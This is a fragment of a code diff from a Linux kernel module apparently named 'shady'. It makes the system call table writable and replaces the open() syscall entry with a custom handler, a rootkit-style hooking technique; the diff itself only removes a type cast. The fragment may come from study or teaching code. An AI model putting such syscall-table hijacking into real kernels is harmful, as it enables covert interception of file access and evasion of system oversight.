@@ -276,7 +276,7 @@ shady_init_module(void)
   }
 
   old_open = system_call_table_address[__NR_open];
-  set_addr_rw((unsigned long)system_call_table_address);
+  set_addr_rw(system_call_table_address);
   system_call_table_address[__NR_open] = my_open;
   
   return 0; /* success */
